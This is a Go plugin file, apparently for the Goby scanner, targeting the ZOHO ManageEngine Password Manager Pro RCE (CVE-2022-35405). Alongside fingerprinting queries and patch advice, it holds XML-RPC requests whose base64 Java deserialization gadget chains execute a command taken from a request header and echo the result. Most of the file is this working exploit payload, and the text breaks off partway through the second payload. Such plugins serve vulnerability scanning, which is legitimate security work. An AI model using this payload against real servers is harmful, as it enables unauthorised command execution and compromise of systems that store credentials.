package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "ZOHO ManageEngine Password Manager Pro RCE (CVE-2022-35405)",
    "Description": "<p>ZOHO ManageEngine Password Manager Pro is a password manager from the American company ZOHO.</p><p>ZOHO ManageEngine Password Manager Pro versions prior to 12101 and PAM360 prior to 5510 have security vulnerabilities, attackers can execute arbitrary commands to gain server privileges.</p>",
    "Product": "ZOHO ManageEngine Password Manager Pro",
    "Homepage": "https://www.manageengine.com/products/passwordmanagerpro/",
    "DisclosureDate": "2022-07-22",
    "Author": "Y4er",
    "FofaQuery": "banner=\"Server: PMP\" || header=\"Server: PMP\" || banner=\"Set-Cookie: pmpcc=\" || header=\"Set-Cookie: pmpcc=\" || title=\"ManageEngine Password Manager Pro\"",
    "GobyQuery": "banner=\"Server: PMP\" || header=\"Server: PMP\" || banner=\"Set-Cookie: pmpcc=\" || header=\"Set-Cookie: pmpcc=\" || title=\"ManageEngine Password Manager Pro\"",
    "Level": "2",
    "Impact": "<p>ZOHO ManageEngine Password Manager Pro versions prior to 12101 and PAM360 prior to 5510 have security vulnerabilities, attackers can execute arbitrary commands to gain server privileges.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://www.manageengine.com/products/passwordmanagerpro/advisory/cve-2022-35405.html\">https://www.manageengine.com/products/passwordmanagerpro/advisory/cve-2022-35405.html</a></p>",
    "References": [
        "https://www.manageengine.com/products/passwordmanagerpro/release-notes.html#12101"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "payload1,payload2"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/xmlrpc",
                "follow_redirect": true,
                "header": {
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/xml",
                    "cmd": "whoami"
                },
                "data_type": "text",
                "data": "<?xml version=\"1.0\"?>\n<methodCall>\n    <methodName>asd</methodName>\n    <params>\n        <param>\n        <value>\n            <struct>\n                <member>\n                    <name>test</name>\n                    <value>\n                        <serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">\nrO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LjoYjqcyKkSAIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAFpPK/rq+AAAAMgESCgA5AJEKAJIAkwoAkgCUBwCVCgAEAJYLAJcAmAcAmQoAmgCbCAB1CgCcAJ0KAJ4AnwoAngCgBwChCAB4BwCiCgAPAKMKAKQApQcApggATAgAbAgAbQcApwoAFgCoCgAWAKkIAF8HAKoKABoAqwgArAoArQCuCACvCgCwALEIAFEKABoAsgoAJQCzCAC0CgAlALUHALYIALcIALgIALkIALoKALsAvAoAuwC9CgC+AL8HAMAKAC0AwQgAwgoALQDDCgAtAMQKAC0AxQgAxgoAJQDHCgDIAMkKAK0AygcAywcBEAcAzQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAtTHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvWm9ob1RvbWNhdEVjaG87AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAM4BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQAFb3NUeXABABJMamF2YS9sYW5nL1N0cmluZzsBAANjbWQBAAdpc0xpbnV4AQABWgEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAFzAQATTGphdmEvdXRpbC9TY2FubmVyOwEABm91dHB1dAEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAJvMQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAA3JlcQEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAdyZXF1ZXN0AQAbTG9yZy9hcGFjaGUvY295b3RlL1JlcXVlc3Q7AQAIcmVzcG9uc2UBABxMb3JnL2FwYWNoZS9jb3lvdGUvUmVzcG9uc2U7AQABagEAAUkBAAljb25uZWN0b3IBAClMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvQ29ubmVjdG9yOwEAD3Byb3RvY29sSGFuZGxlcgEAI0xvcmcvYXBhY2hlL2NveW90ZS9Qcm90b2NvbEhhbmRsZXI7AQABbwEABmdsb2JhbAEACnByb2Nlc3NvcnMBAA5wcm9jZXNzb3JzTGlzdAEAFUxqYXZhL3V0aWwvQXJyYXlMaXN0OwEAAWkBABlwYXJhbGxlbFdlYmFwcENsYXNzTG9hZGVyAQA2TG9yZy9hcGFjaGUvY2F0YWxpbmEvbG9hZGVyL1BhcmFsbGVsV2ViYXBwQ2xhc3NMb2FkZXI7AQAPc3RhbmRhcmRDb250ZXh0AQAqTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZENvbnRleHQ7AQAHY29udGV4dAEAEmFwcGxpY2F0aW9uQ29udGV4dAEALUxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25Db250ZXh0OwEAB3NlcnZpY2UBAA9zdGFuZGFyZFNlcnZpY2UBACpMb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkU2VydmljZTsBAApjb25uZWN0b3JzAQAqW0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9Db25uZWN0b3I7AQANU3RhY2tNYXBUYWJsZQcAlQcAmQcAzwcAoQcAogcAfAcA0AcA0QcA0gcApwcAqgcA0wcAtgcAVQcA1AcAwAcAywEAClNvdXJjZUZpbGUBABNab2hvVG9tY2F0RWNoby5qYXZhDAA6ADsHANUMANYA1wwA2ADZAQA0b3JnL2FwYWNoZS9jYXRhbGluYS9sb2FkZXIvUGFyYWxsZWxXZWJhcHBDbGFzc0xvYWRlcgwA2gDbBwDcDADdAN4BAChvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0BwDSDADfAOAHAOEMAOIA4wcAzwwA5ADlDADmAOcBACtvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25Db250ZXh0AQAob3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkU2VydmljZQwA6ADpBwDQDADqAOsBACJvcmcvYXBhY2hlL2NveW90ZS9BYnN0cmFjdFByb3RvY29sAQATamF2YS91dGlsL0FycmF5TGlzdAwA7ADtDADmAO4BABlvcmcvYXBhY2hlL2NveW90ZS9SZXF1ZXN0DADvAPABAANyY2UHANMMAPEA8gEAB29zLm5hbWUHAPMMAPQA9QwA9gD1DAD3APgBAAN3aW4MAPkA+gEAEGphdmEvbGFuZy9TdHJpbmcBAAJzaAEAAi1jAQAHY21kLmV4ZQEAAi9jBwD7DAD8AP0MAP4A/wcBAAwBAQECAQARamF2YS91dGlsL1NjYW5uZXIMADoBAwEAAlxhDAEEAQUMAQYBBwwBCAD4AQAADAEJAQoHAQsMAQwBDQwBDgEPAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAK3lzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvWm9ob1RvbWNhdEVjaG8BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBACdvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9Db25uZWN0b3IBACFvcmcvYXBhY2hlL2NveW90ZS9Qcm90b2NvbEhhbmRsZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAab3JnL2FwYWNoZS9jb3lvdGUvUmVzcG9uc2UBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAxnZXRSZXNvdXJjZXMBACcoKUxvcmcvYXBhY2hlL2NhdGFsaW5hL1dlYlJlc291cmNlUm9vdDsBACNvcmcvYXBhY2hlL2NhdGFsaW5hL1dlYlJlc291cmNlUm9vdAEACmdldENvbnRleHQBAB8oKUxvcmcvYXBhY2hlL2NhdGFsaW5hL0NvbnRleHQ7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAPamF2YS9sYW5nL0NsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA5maW5kQ29ubmVjdG9ycwEALCgpW0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9Db25uZWN0b3I7AQASZ2V0UHJvdG9jb2xIYW5kbGVyAQAlKClMb3JnL2FwYWNoZS9jb3lvdGUvUHJvdG9jb2xIYW5kbGVyOwEABHNpemUBAAMoKUkBABUoSSlMamF2YS9sYW5nL09iamVjdDsBAAtnZXRSZXNwb25zZQEAHigpTG9yZy9hcGFjaGUvY295b3RlL1Jlc3BvbnNlOwEACWFkZEhlYWRlcgEAJyhMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspVgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0SGVhZGVyAQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7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\n                        </serializable>\n                    </value>\n                </member>\n            </struct>\n        </value>\n        </param>\n    </params>\n</methodCall>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "rce: rce",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/xmlrpc",
                "follow_redirect": true,
                "header": {
                    "X-Requested-With": "XMLHttpRequest",
                    "Content-Type": "application/xml",
                    "cmd": "echo 1231|md5sum"
                },
                "data_type": "text",
                "data": "<?xml version=\"1.0\"?>\n<methodCall>\n    <methodName>asd</methodName>\n    <params>\n        <param>\n        <value>\n            <struct>\n                <member>\n                    <name>test</name>\n                    <value>\n                        <serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\">rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPjgGC/k7xfgIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgAqamF2YS5sYW5nLlN0cmluZyRDYXNlSW5zZW5zaXRpdmVDb21wYXJhdG9ydwNcfVxQ5c4CAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAAFK/K/rq+AAAAMwEFCgBFAIkKAIoAiwoAigCMCgAdAI0IAHoKABsAjgoAjwCQCgCPAJEHAHsKAIoAkggAkwoAIACUCACVCACWBwCXCACYCABYBwCZCgAbAJoIAJsIAHAHAJwLABYAnQsAFgCeCABnCACfBwCgCgAbAKEHAKIKAKMApAgApQcApggApwoAIACoCACpCQAlAKoHAKsKACUArAgArQoArgCvCgAgALAIALEIALIIALMIALQIALUHALYHALcKADAAuAoAMAC5CgC6ALsKAC8AvAgAvQoALwC+CgAvAL8KACAAwAgAwQoAGwDCCgAbAMMIAMQHAGQKABsAxQgAxgcAxwgAyAgAyQcAygcBAwcAzAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAsTHlzb3NlcmlhbC9wYXlsb2Fkcy90ZW1wbGF0ZXMvVG9tY2F0Q21kRWNobzsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAzQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBAANjbHMBABFMamF2YS9sYW5nL0NsYXNzOwEABHZhcjUBACFMamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbjsBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAAltCAQAJcHJvY2Vzc29yAQASTGphdmEvbGFuZy9PYmplY3Q7AQADcmVxAQAEcmVzcAEAAWoBAAFJAQABdAEAEkxqYXZhL2xhbmcvVGhyZWFkOwEAA3N0cgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA29iagEACnByb2Nlc3NvcnMBABBMamF2YS91dGlsL0xpc3Q7AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQABaQEABGZsYWcBAAFaAQAFZ3JvdXABABdMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEAAWYBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAHdGhyZWFkcwEAE1tMamF2YS9sYW5nL1RocmVhZDsBAA1TdGFja01hcFRhYmxlBwDOBwDPBwDQBwCmBwCiBwCZBwCcBwBiBwDHBwDKAQAKU291cmNlRmlsZQEAElRvbWNhdENtZEVjaG8uamF2YQwARgBHBwDQDADRANIMANMA1AwA1QDWDADXANgHAM8MANkA2gwA2wDcDADdAN4BAARleGVjDADfAOABAARodHRwAQAGdGFyZ2V0AQASamF2YS9sYW5nL1J1bm5hYmxlAQAGdGhpcyQwAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDADhANYBAAZnbG9iYWwBAA5qYXZhL3V0aWwvTGlzdAwA4gDjDADbAOQBAAtnZXRSZXNwb25zZQEAD2phdmEvbGFuZy9DbGFzcwwA5QDmAQAQamF2YS9sYW5nL09iamVjdAcA5wwA6ADpAQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAwA6gDrAQAJc2V0U3RhdHVzDADsAF4BABFqYXZhL2xhbmcvSW50ZWdlcgwARgDtAQAHb3MubmFtZQcA7gwA7wDwDADxAN4BAAN3aW4BAAdjbWQuZXhlAQACL2MBAAkvYmluL2Jhc2gBAAItYwEAEWphdmEvdXRpbC9TY2FubmVyAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyDABGAPIMAPMA9AcA9QwA9gD3DABGAPgBAAJcQQwA+QD6DAD7AN4MAPwA/QEAJG9yZy5hcGFjaGUudG9tY2F0LnV0aWwuYnVmLkJ5dGVDaHVuawwA/gD/DAEAAQEBAAhzZXRCeXRlcwwBAgDmAQAHZG9Xcml0ZQEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24BABNqYXZhLm5pby5CeXRlQnVmZmVyAQAEd3JhcAEAE2phdmEvbGFuZy9FeGNlcHRpb24BACp5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL1RvbWNhdENtZEVjaG8BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAVamF2YS9sYW5nL1RocmVhZEdyb3VwAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAdnZXROYW1lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEADWdldFN1cGVyY2xhc3MBAARzaXplAQADKClJAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAB2lzRW1wdHkBAAMoKVoBAARUWVBFAQAEKEkpVgEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQALdG9Mb3dlckNhc2UBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAFc3RhcnQBABUoKUxqY